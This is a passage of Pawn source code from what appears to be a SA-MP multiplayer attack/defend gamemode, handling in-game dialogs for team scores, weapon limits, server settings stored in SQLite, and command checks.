			CurrentRound = TeamScore[ATTACKER] + TeamScore[DEFENDER];

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set defender team score to: {FFFFFF}%d", Player[playerid][Name], TeamScore[DEFENDER]);
			SendClientMessageToAll(-1, iString);

			format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
		    TextDrawSetString(TeamScoreText, iString);

			format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
			TextDrawSetString(RoundsPlayed, iString);
		}
		return 1;
	}


	if(dialogid == DIALOG_WEAPONS_LIMIT)
	{
		if(response == 1  && listitem > 0)
		{
		    new iString[64];
		    format(iString, sizeof(iString), ""COL_PRIM"Enter %s/%s Limit Below:", WeaponNames[GunMenuWeapons[listitem-1][0]], WeaponNames[GunMenuWeapons[listitem-1][1]]);
		    Player[playerid][LastEditWepLimit] = listitem-1;
		    ShowPlayerDialog(playerid, DIALOG_SET_1, DIALOG_STYLE_INPUT,""COL_PRIM"Weapon Limit",iString,"Okay","Close");

		}
		return 1;
	}

	if(dialogid == DIALOG_SET_1)
	{
		if(response)
		{
			if(!IsNumeric(inputtext))
			{
			    SendErrorMessage(playerid,"You can only use numbers.");
				new str[64];
			    format(str, sizeof(str), ""COL_PRIM"Enter %s/%s Limit Below:", WeaponNames[GunMenuWeapons[Player[playerid][LastEditWepLimit]][0]], WeaponNames[GunMenuWeapons[Player[playerid][LastEditWepLimit]][1]]);
				ShowPlayerDialog(playerid, DIALOG_SET_1, DIALOG_STYLE_INPUT,"{FFFFFF}Weapon Limit",str,"Okay","Close");
				return 1;
			}
		    if(isnull(inputtext))
			{
			    SendErrorMessage(playerid,"Enter something at least stupid fuck.");
				new str[64];
			    format(str, sizeof(str), ""COL_PRIM"Enter %s/%s Limit Below:", WeaponNames[GunMenuWeapons[Player[playerid][LastEditWepLimit]][0]], WeaponNames[GunMenuWeapons[Player[playerid][LastEditWepLimit]][1]]);
				ShowPlayerDialog(playerid, DIALOG_SET_1, DIALOG_STYLE_INPUT,"{FFFFFF}Weapon Limit",str,"Okay","Close");
				return 1;
			}
			new lim = strval(inputtext);
			WeaponLimit[Player[playerid][LastEditWepLimit]] = lim;

			new string[128];
		    format(string,sizeof(string),"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",WeaponLimit[0],WeaponLimit[1],WeaponLimit[2],WeaponLimit[3],WeaponLimit[4],WeaponLimit[5],WeaponLimit[6],WeaponLimit[7],WeaponLimit[8],WeaponLimit[9]);
			format(string, sizeof(string), "UPDATE Configs SET Value = '%s' WHERE Option = 'Weapon Limits'", string);
		    db_free_result(db_query(sqliteconnection, string));


			ShowWepLimit(playerid);
			format(string, sizeof(string), "{FFFFFF}%s "COL_PRIM"has changed {FFFFFF}| %s - %s | "COL_PRIM"limit to {FFFFFF}%d", Player[playerid][Name], WeaponNames[GunMenuWeapons[Player[playerid][LastEditWepLimit]][0]], WeaponNames[GunMenuWeapons[Player[playerid][LastEditWepLimit]][1]], lim);
			SendClientMessageToAll(-1, string);

			return 1;
		}
		else
		{
		    ShowWepLimit(playerid);
		}
		return 1;
	}

	if(dialogid == DIALOG_CONFIG)
	{
	    if(response)
		{
		    new iString[128];
	        switch(listitem)
			{
	            case 0: {
	                iString = ""COL_PRIM"Enter {FFFFFF}Attacker "COL_PRIM"Team Name Below:";
				    ShowPlayerDialog(playerid, DIALOG_ATT_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Name",iString,"Next","Close");
	            }
	            case 1: {
	                format(iString, sizeof(iString), "%sAttacker Team\n%sDefender Team", TextColor[ATTACKER], TextColor[DEFENDER]);
	                ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_TEAM_SKIN, DIALOG_STYLE_LIST, ""COL_PRIM"Select team", iString, "OK", "Cancel");
	            }
	            case 2: {
					new WepTStr[700];
					format(WepTStr, sizeof(WepTStr), "{FF0000}ID\tPrimary Weapon\tSecondary Weapon\tAvailibility\n");
					for(new i=0; i < 10; ++i)
					{
						new tabs[7] = "";

						if(GunMenuWeapons[i][1] != 25 && GunMenuWeapons[i][1] != 23) {
							tabs = "\t";
						}

						if( i % 2 == 0) format(iString, sizeof(iString), "{FF3333}%d\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[ATTACKER][i]);
						else format(iString, sizeof(iString), "{FF6666}%d\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[ATTACKER][i]);
						strcat(WepTStr, iString);
					}
					ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_WEAPONS, DIALOG_STYLE_LIST, "Select Weapons to change", WepTStr, "OK", "Cancel");
	            }
				case 3: {
				    ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_AAD, DIALOG_STYLE_LIST, ""COL_PRIM"A/D Config", ""COL_PRIM"Health\n"COL_PRIM"Armour\n"COL_PRIM"Round Time\n"COL_PRIM"CP Time", "OK", "Cancel");
				}
				case 4: {
				    SendRconCommand("gmx");
				}
				case 5: {
				    ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_MAX_PING, DIALOG_STYLE_INPUT, ""COL_PRIM"Set max Ping", "Set the max ping:", "OK", "Cancel");
				}
				case 6: {
				    ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_MAX_PACKET, DIALOG_STYLE_INPUT, ""COL_PRIM"Set max Packetloss", "Set the max packetloss:", "OK", "Cancel");
				}
				case 7: {
				    ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_MIN_FPS, DIALOG_STYLE_INPUT, ""COL_PRIM"Set Minimum FPS", "Set the minimum FPS:", "OK", "Cancel");
				}
				case 8: {
				    if(!ServerLocked) {
				        ShowPlayerDialog(playerid, DIALOG_SERVER_PASS, DIALOG_STYLE_INPUT,""COL_PRIM"Server Password",""COL_PRIM"Enter server password below:", "Ok","Close");
				    } else {
				        SendRconCommand("password 0");
				        ServerLocked = false;
				        PermLocked = false;
				    }
				}
				case 9: {
				    if(ToggleTargetInfo == true) {
				        ToggleTargetInfo = false;
				        foreach(new i : Player) {
							KillTimer(TargetInfoTimer[i]);
							PlayerTextDrawHide(i, TargetInfoTD);
							TargetInfoTimer[i] = -1;
						}

						format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"target player information", Player[playerid][Name]);
					} else {
					    ToggleTargetInfo = true;
					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"target player information", Player[playerid][Name]);
					}
					SendClientMessageToAll(-1, iString);

					format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'TargetInformation'", (ToggleTargetInfo == false ? 0 : 1));
				    db_free_result(db_query(sqliteconnection, iString));

				    ShowConfigDialog(playerid);
				}
				case 10: {
				    if(AntiSpam == false) {
					    AntiSpam = true;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"anti-spam.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
				    } else {
				        AntiSpam = false;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"anti-spam.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}
                    ShowConfigDialog(playerid);
				}
				case 11: {
				    if(AutoBal == false) {
					    AutoBal = true;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"auto-balance in non war mode.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
				    } else {
				        AutoBal = false;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"auto-balance in non war mode.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}
                    ShowConfigDialog(playerid);
				}
				case 12: {
				    if(AutoPause == false) {
					    AutoPause = true;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"Auto-Pause on player disconnect in war mode.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
				    } else {
				        AutoPause = false;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"Auto-Pause on player disconnect in war mode.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}
                    ShowConfigDialog(playerid);
				}
				case 13: {
					if(LobbyGuns == true) {
						LobbyGuns = false;
				    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"guns in lobby.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					} else {
						LobbyGuns = true;
					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"guns in lobby.", Player[playerid][Name]);
				        SendClientMessageToAll(-1, iString);
					}
				    ShowConfigDialog(playerid);
				}
				case 14: {
				    if(ShortCuts == false) {
					    ShortCuts = true;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"shortcut team messages.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
				    } else {
				        ShortCuts = false;
	    				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"shortcut team messages.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}
                    ShowConfigDialog(playerid);
				}
				case 15: {
					if(ServerAntiLag == false) {
					    if(Current != -1)
							return SendErrorMessage(playerid, "You cannot do this while round is in progress.");
					    ServerAntiLag = true;

					    foreach(new i : Player) {
							SAMP_SetPlayerTeam(i, ANTILAG_TEAM);
					    }
						TextDrawSetString(AntiLagTD, sprintf("%sAntiLag: ~g~On", MAIN_TEXT_COLOUR));
						TextDrawShowForAll(AntiLagTD);
					} else {
					    if(Current != -1)
							return SendErrorMessage(playerid, "You cannot do this while round is in progress.");
					    ServerAntiLag = false;
					    foreach(new i : Player) {
					        if(Player[i][Playing] == true) {
					            if(Player[i][Team] == ATTACKER) SAMP_SetPlayerTeam(playerid, ATTACKER);
					            else if(Player[i][Team] == DEFENDER) SAMP_SetPlayerTeam(playerid, DEFENDER);
								else if(Player[i][Team] == REFEREE) SAMP_SetPlayerTeam(playerid, REFEREE);
							} else {
								if(Player[playerid][AntiLag] == true) SAMP_SetPlayerTeam(playerid, 5);
								else SAMP_SetPlayerTeam(playerid, NO_TEAM);
							}
						}
						TextDrawSetString(AntiLagTD, "_");
						TextDrawHideForAll(AntiLagTD);
					}

					format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has %s server Anti-Lag.", Player[playerid][Name], (ServerAntiLag == true ? ("{FFFFFF}enabled") : ("{FFFFFF}disabled")));
					SendClientMessageToAll(-1, iString);

					format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'AntiLag'", (ServerAntiLag == false ? 0 : 1));
				    db_free_result(db_query(sqliteconnection, iString));

				    ShowConfigDialog(playerid);
				}
				case 16: {
					if(GiveKnife == false)
					{
					    GiveKnife = true;

					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"auto-give knife in rounds.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
						foreach(new i : Player)
						{
						    if(Player[i][Playing])
						    {
						        GivePlayerWeapon(i, WEAPON_KNIFE, 9999);
						    }
						}
					}
					else
					{
					    GiveKnife = false;
					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"auto-give knife in rounds.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
						foreach(new i : Player)
						{
						    if(Player[i][Playing])
						    {
						        RemovePlayerWeapon(i, WEAPON_KNIFE);
						    }
						}
					}

					format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'UseKnife'", (GiveKnife == false ? 0 : 1));
				    db_free_result(db_query(sqliteconnection, iString));

				    ShowConfigDialog(playerid);
				}
				case 17: {
					if(ShowBodyLabels == false)
					{
					    ShowBodyLabels = true;

					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"show body labels option.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
						foreach(new i : Player)
						{
						    Delete3DTextLabel(PingFPS[i]);
						    Delete3DTextLabel(DmgLabel[i]);
						    PingFPS[i] = Create3DTextLabel("_", 0x00FF00FF, 0, 0, 0, DRAW_DISTANCE, 0, 1);
						    Attach3DTextLabelToPlayer(PingFPS[i], i, 0.0, 0.0, -0.745);
							DmgLabel[i] = Create3DTextLabel(" ", -1, 0, 0, 0, 40.0, 0, 1);
							Attach3DTextLabelToPlayer(DmgLabel[i], i, 0.0, 0.0, 0.8);
						}
					}
					else
					{
					    ShowBodyLabels = false;
					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"show body labels option.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
						foreach(new i : Player)
						{
						    Delete3DTextLabel(PingFPS[i]);
						    Delete3DTextLabel(DmgLabel[i]);
						}
					}

					format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'ShowBodyLabels'", (ShowBodyLabels == false ? 0 : 1));
				    db_free_result(db_query(sqliteconnection, iString));

				    ShowConfigDialog(playerid);
				}
				case 18: {
					if(VoteRound == false)
					{
					    VoteRound = true;

					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"(/vote){FFFFFF} command.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}
					else
					{
					    VoteRound = false;
					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"(/vote){FFFFFF} command.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}

					format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'VoteRound'", (VoteRound == false ? 0 : 1));
				    db_free_result(db_query(sqliteconnection, iString));

				    ShowConfigDialog(playerid);
				}
				case 19: {
					if(ChangeName == false)
					{
					    ChangeName = true;

					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"(/changename){FFFFFF} command.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}
					else
					{
					    ChangeName = false;
					    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"(/changename){FFFFFF} command.", Player[playerid][Name]);
						SendClientMessageToAll(-1, iString);
					}

					format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'ChangeName'", (VoteRound == false ? 0 : 1));
				    db_free_result(db_query(sqliteconnection, iString));

				    ShowConfigDialog(playerid);
				}
	        }
	    }
	}

	if(dialogid == DIALOG_CONFIG_SET_TEAM_SKIN) {
	    if(response) {
			switch(listitem) {
				case 0: { ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_ATT_SKIN, DIALOG_STYLE_INPUT, ""COL_PRIM"Attacker Name", ""COL_PRIM"Set the attacker skin below:", "OK", "Cancel"); }
		        case 1: { ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_DEF_SKIN, DIALOG_STYLE_INPUT, ""COL_PRIM"Defender Name", ""COL_PRIM"Set the defender skin below:", "OK", "Cancel"); }
			}
		} else {
            ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_AAD) {
	    if(response) {
		    switch(listitem) {
		        case 0: { // set round health
		            ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_ROUND_HEALTH, DIALOG_STYLE_INPUT, ""COL_PRIM"Round Health", ""COL_PRIM"Set round health:", "OK", "");
		        }
		        case 1: { // set round armour
		            ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_ROUND_ARMOUR, DIALOG_STYLE_INPUT, ""COL_PRIM"Round Armour", ""COL_PRIM"Set round armour:", "OK", "");
		        }
		        case 2: { // Round time
					ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_ROUND_TIME, DIALOG_STYLE_INPUT, ""COL_PRIM"Round Time", ""COL_PRIM"Set round time:", "OK", "Cancel");
		        }
		        case 3: { // CP time
		            ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_CP_TIME, DIALOG_STYLE_INPUT, ""COL_PRIM"CP Time", ""COL_PRIM"Set CP time:", "OK", "Cancel");
		        }
			}
		} else {
            ShowConfigDialog(playerid);
	    }
	}

	if(dialogid == DIALOG_CONFIG_SET_ROUND_HEALTH) {
        new Float:hp = floatstr(inputtext);
		if(hp <= 0 || hp > 100) {
			SendErrorMessage(playerid,"Health value can be between 0 and 100 maximum.");
			ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_ROUND_HEALTH, DIALOG_STYLE_INPUT, ""COL_PRIM"Round Health", ""COL_PRIM"Set round health:", "OK", "");
			return 1;
		}

		RoundHP = hp;

		new str[128];
		format(str, sizeof(str), "%s "COL_PRIM"has changed the round health to: {FFFFFF}%0.2f", Player[playerid][Name], RoundHP);
		SendClientMessageToAll(-1, str);

		format(str, sizeof(str), "UPDATE `Configs` SET `Value` = '%f,%f' WHERE `Option` = 'RoundHPAR'", RoundHP, RoundAR);
		db_free_result(db_query(sqliteconnection, str));

		ShowConfigDialog(playerid);

	}

	if(dialogid == DIALOG_CONFIG_SET_ROUND_ARMOUR) {
        new Float:hp = floatstr(inputtext);
		if(hp <= 0 || hp > 100) {
			SendErrorMessage(playerid,"Armour value can be between 0 and 100 maximum.");
			ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_ROUND_ARMOUR, DIALOG_STYLE_INPUT, ""COL_PRIM"Round Armour", ""COL_PRIM"Set round armour:", "OK", "");
			return 1;
		}

		RoundAR = hp;

		new str[128];
		format(str, sizeof(str), "%s "COL_PRIM"has changed the round armour to: {FFFFFF}%0.2f", Player[playerid][Name], RoundAR);
		SendClientMessageToAll(-1, str);

		format(str, sizeof(str), "UPDATE `Configs` SET `Value` = '%f,%f' WHERE `Option` = 'RoundHPAR'", RoundHP, RoundAR);
		db_free_result(db_query(sqliteconnection, str));

		ShowConfigDialog(playerid);
	}

	if(dialogid == DIALOG_CONFIG_SET_ROUND_TIME) {
		if(response) {
			cmd_roundtime(playerid, inputtext);
			ShowConfigDialog(playerid);
		} else {
            ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_CP_TIME) {
	    if(response) {
			cmd_cptime(playerid, inputtext);
			ShowConfigDialog(playerid);
		} else {
            ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_ATT_SKIN) {
	    new str[32];
	    format(str, sizeof(str), "0 %s", inputtext);
	    cmd_teamskin(playerid, str);

	    ShowConfigDialog(playerid);
	}

	if(dialogid == DIALOG_CONFIG_SET_DEF_SKIN) {
	    new str[32];
	    format(str, sizeof(str), "1 %s", inputtext);
	    cmd_teamskin(playerid, str);

	    ShowConfigDialog(playerid);
	}

	if(dialogid == DIALOG_CONFIG_SET_WEAPONS) {
	    if(response) {
			new str[64];
			format(str, sizeof(str), ""COL_PRIM"Set Primary weapon for gunmenu ID {FFFFFF}%d", listitem);
			Player[playerid][LastEditWeaponSlot] = listitem-1;
			ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_FIRST_WEAPON, DIALOG_STYLE_INPUT, ""COL_PRIM"Set Primary Weapon", str, "OK", "Cancel");
		} else {
            ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_FIRST_WEAPON) {
		if(response) {
			if(!IsNumeric(inputtext)) {
				SendErrorMessage(playerid,"Invalid weapon ID, find valid weapon id's here: http://wiki.sa-mp.com/wiki/Weapons");
				new str[64];
				format(str, sizeof(str), ""COL_PRIM"Set Primary weapon for gunmenu ID {FFFFFF}%d", Player[playerid][LastEditWeaponSlot]+1);
				ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_FIRST_WEAPON, DIALOG_STYLE_INPUT, ""COL_PRIM"Set Primary Weapon", str, "OK", "Cancel");
				return 1;
			}
			GunMenuWeapons[Player[playerid][LastEditWeaponSlot]][0] = strval(inputtext);
			new str[64];
			format(str, sizeof(str), ""COL_PRIM"Set Secondary weapon for gunmenu ID {FFFFFF}%d", Player[playerid][LastEditWeaponSlot]+1);
			ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_SECOND_WEAPON, DIALOG_STYLE_INPUT, ""COL_PRIM"Set Secondary Weapon", str, "OK", "");
		} else {
			ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_SECOND_WEAPON) {
		if(response) {
			if(!IsNumeric(inputtext)) {
				SendErrorMessage(playerid,"Invalid weapon ID, find valid weapon id's here: http://wiki.sa-mp.com/wiki/Weapons");
				new str[64];
				format(str, sizeof(str), ""COL_PRIM"Set Secondary weapon for gunmenu ID {FFFFFF}%d", Player[playerid][LastEditWeaponSlot]+1);
				ShowPlayerDialog(playerid, DIALOG_CONFIG_SET_SECOND_WEAPON, DIALOG_STYLE_LIST, ""COL_PRIM"Set Secondary Weapon", str, "OK", "");
				return 1;
			}
			GunMenuWeapons[Player[playerid][LastEditWeaponSlot]][1] = strval(inputtext);

			new query[300] = "UPDATE `Configs` SET `Value` = '";
			for(new i=0; i < 10; ++i) {
				new str[50];
				format(str, sizeof(str), "%d,%d|", GunMenuWeapons[i][0], GunMenuWeapons[i][1]);
				strcat(query, str);
			}
			strcat(query, "' WHERE `Option` = 'GunMenuWeapons'");

			db_free_result(db_query(sqliteconnection, query));
			Player[playerid][LastEditWeaponSlot] = -1;

			ShowConfigDialog(playerid);
		} else {
			ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_MAX_PING) {
	    if(response) {
            cmd_maxping(playerid, inputtext);
            ShowConfigDialog(playerid);
		} else {
            ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_MAX_PACKET) {
	    if(response) {
            cmd_maxpacket(playerid, inputtext);
            ShowConfigDialog(playerid);
		} else {
            ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_CONFIG_SET_MIN_FPS)
	{
	    if(response)
		{
			cmd_minfps(playerid, inputtext);
			ShowConfigDialog(playerid);
		}
		else
		{
			ShowConfigDialog(playerid);
		}
	}

	if(dialogid == DIALOG_SWITCH_TEAM) {
	    if(response) {
	        switch(listitem) {
	            case 0: {
      				SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
            		Player[playerid][Team] = ATTACKER;
				} case 1: {
				    SetPlayerColor(playerid, ATTACKER_SUB_COLOR);
				    Player[playerid][Team] = ATTACKER_SUB;
				} case 2: {
				    SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
				    Player[playerid][Team] = DEFENDER;
				} case 3: {
				    SetPlayerColor(playerid, DEFENDER_SUB_COLOR);
				    Player[playerid][Team] = DEFENDER_SUB;
				} case 4: {
				    SetPlayerColor(playerid, REFEREE_COLOR);
				    Player[playerid][Team] = REFEREE;
				}
			}
			SwitchTeamFix(playerid);
		}
		return 1;
	}

	if(dialogid == DIALOG_SWITCH_TEAM_CLASS)
	{
	    if(response)
		{
	        switch(listitem)
			{
	            case 0:
				{
      				SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
            		Player[playerid][Team] = ATTACKER;
				}
				case 1:
				{
				    SetPlayerColor(playerid, ATTACKER_SUB_COLOR);
				    Player[playerid][Team] = ATTACKER_SUB;
				}
				case 2:
				{
				    SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
				    Player[playerid][Team] = DEFENDER;
				}
				case 3:
				{
				    SetPlayerColor(playerid, DEFENDER_SUB_COLOR);
				    Player[playerid][Team] = DEFENDER_SUB;
				}
				case 4:
				{
				    SetPlayerColor(playerid, REFEREE_COLOR);
				    Player[playerid][Team] = REFEREE;
				}
			}
			SwitchTeamFix(playerid);
			SpawnPlayer(playerid);
		}
		else
		{
		    new iString[128];
			format(iString, sizeof(iString), "%s%s\n%s%s Sub\n%s%s\n%s%s Sub\n%sReferee", TextColor[ATTACKER], TeamName[ATTACKER], TextColor[ATTACKER_SUB], TeamName[ATTACKER], TextColor[DEFENDER], TeamName[DEFENDER], TextColor[DEFENDER_SUB], TeamName[DEFENDER], TextColor[REFEREE]);
			ShowPlayerDialog(playerid, DIALOG_SWITCH_TEAM_CLASS, DIALOG_STYLE_LIST, "{FFFFFF}Team Selection",iString, "Select", "Exit");
		}
		return 1;
	}
	return 1;
}



public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	if(clickedid == RoundsPlayed) {
	    new iString[64];
		iString = ""COL_PRIM"Enter current round or total rounds to be played:";
	    ShowPlayerDialog(playerid, DIALOG_CURRENT_TOTAL, DIALOG_STYLE_INPUT,""COL_PRIM"Rounds Dialog",iString,"Current","Total");
	    return 1;
	}

	if(clickedid == TeamScoreText) {
	    new iString[64];
	    iString = ""COL_PRIM"Team Names\n"COL_PRIM"Team Scores\n"COL_PRIM"Reset Scores";
	    ShowPlayerDialog(playerid, DIALOG_TEAM_SCORE, DIALOG_STYLE_LIST,""COL_PRIM"Team Dialog",iString,"Select","Close");
		return 1;
	}

	if(clickedid == WeaponLimitTD) {
	    ShowWepLimit(playerid);
		return 1;
	}

	if(clickedid == WarModeText) {
	    if(Current != -1) return SendErrorMessage(playerid,"Can't use this option while round is on.");

		if(WarMode == false) {

			MatchRoundsStarted = 0;
			for( new i = 0; i < 101; i++ )
			{
			    MatchRoundsRecord[ i ][ round__ID ] = -1;
			    MatchRoundsRecord[ i ][ round__type ] = -1;
			    MatchRoundsRecord[ i ][ round__completed ] = false;
			}

			foreach(new i : Player) {
			    for(new j = 0; j < 55; j ++)
  					Player[i][WeaponStat][j] = 0;
   				Player[i][TotalKills] = 0;
				Player[i][TotalDeaths] = 0;
				Player[i][TotalDamage] = 0;
				Player[i][RoundPlayed] = 0;
			    Player[i][TotalBulletsFired] = 0;
			    Player[i][TotalshotsHit] = 0;
			}
            new iString[64];
			iString = ""COL_PRIM"Enter {FFFFFF}Attacker "COL_PRIM"Team Name Below:";
	    	ShowPlayerDialog(playerid, DIALOG_ATT_NAME, DIALOG_STYLE_INPUT,""COL_PRIM"Attacker Team Name",iString,"Next","Close");
		} else {
	    	ShowPlayerDialog(playerid, DIALOG_WAR_RESET, DIALOG_STYLE_MSGBOX,""COL_PRIM"War Dialog",""COL_PRIM"Are you sure you want to turn War Mode off?","Yes","No");
		}

		return 1;
	}

	if(clickedid == LockServerTD) {
		if(ServerLocked == false) {
		   ShowPlayerDialog(playerid, DIALOG_SERVER_PASS, DIALOG_STYLE_INPUT,""COL_PRIM"Server Password",""COL_PRIM"Enter server password below:", "Ok","Close");
		} else {
		    new iString[128];
			iString = "password 0";
			SendRconCommand(iString);

			format(iString, sizeof iString, "%sServer: ~r~Unlocked", MAIN_TEXT_COLOUR);
			TextDrawSetString(LockServerTD, iString);

			ServerLocked = false;
			PermLocked = false;

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unlocked the server.", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);
		}
		return 1;
	}

	if(clickedid == CloseText) {
        TextDrawHideForPlayer(playerid, WeaponLimitTD);
        TextDrawHideForPlayer(playerid, WarModeText);
        TextDrawHideForPlayer(playerid, SettingBox);
        TextDrawHideForPlayer(playerid, LockServerTD);
        TextDrawHideForPlayer(playerid, CloseText);

        CancelSelectTextDraw(playerid);
        return 1;
	}

	if(PlayerOnInterface[playerid] == true) {
	    if(clickedid == Text:65535) {
	        TextDrawHideForPlayer(playerid, WeaponLimitTD);
	        TextDrawHideForPlayer(playerid, WarModeText);
	        TextDrawHideForPlayer(playerid, SettingBox);
	        TextDrawHideForPlayer(playerid, LockServerTD);
	        TextDrawHideForPlayer(playerid, CloseText);
		}
		return 1;
	}

	return 0;
}

//------------------------------------------------------------------------------
// Commands
//------------------------------------------------------------------------------


public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(AntiSpam == true && GetTickCount() < Player[playerid][lastChat]) { SendErrorMessage(playerid,"Please wait."); return 0; }
	Player[playerid][lastChat] = GetTickCount()+1000;


   	if(AllowStartBase == false) return 0;

	if(Player[playerid][IsAFK] == true) {
		new CmdText[50];
  		sscanf(cmdtext, "s", CmdText);
	 	if(strcmp(CmdText, "/back", true) == 0) return 1;
	 	else {
	 		SendErrorMessage(playerid,"Can't use any command in AFK mode. {FFFFFF}Type /back");
			return 0;
		}
	}
	
	if(Player[playerid][InDuel] == true) {
		new CmdText[50];
		sscanf(cmdtext, "s", CmdText);
	 	if(strcmp(CmdText, "/rq", true) == 0)
			return 1;
	 	else if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid))
		 {
	 		SendErrorMessage(playerid, "Can't use any command in duel. Type {FFFFFF}/rq "COL_PRIM"to quit duel.");
			return 0;
		}
	}

	if(Player[playerid][Team] == NON)
	{
	    SendErrorMessage(playerid,"You need to spawn to be able to use commands.");
		return 0;
	}
	return 1;
}

